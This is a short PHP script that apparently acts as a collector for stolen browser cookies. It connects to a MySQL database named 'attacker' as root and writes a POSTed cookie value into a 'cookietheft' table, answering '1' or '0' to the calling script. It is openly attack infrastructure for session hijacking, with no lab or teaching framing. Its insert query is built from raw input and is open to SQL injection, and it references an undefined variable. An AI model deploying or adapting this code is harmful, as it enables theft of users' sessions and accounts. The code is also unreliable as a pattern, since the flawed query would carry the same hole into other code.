<?php 
	$dhost = "localhost";
	$duser = "root";
	$dpass = "";
	$dbase = "attacker";
	$con = mysqli_connect($dhost,$duser,$dpass,$dbase);
	// Check connection
	if (mysqli_connect_errno()) {
		echo "Failed to connect to MySQL: ".mysqli_connect_errno();
		exit();
	}

	if(isset($_POST['sendcookie'])) {
		$uname = isset($_POST['c']) ? $_POST['c'] : '';
		$query = sprintf("INSERT INTO cookietheft (cookie_id, cookie) VALUES (NULL, '%s')", $uname, $pass);
		$result = mysqli_query($con, $query);
		if($result) { echo "1"; }
		else { echo "0"; }
	}
?>
<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body></body>
</html>
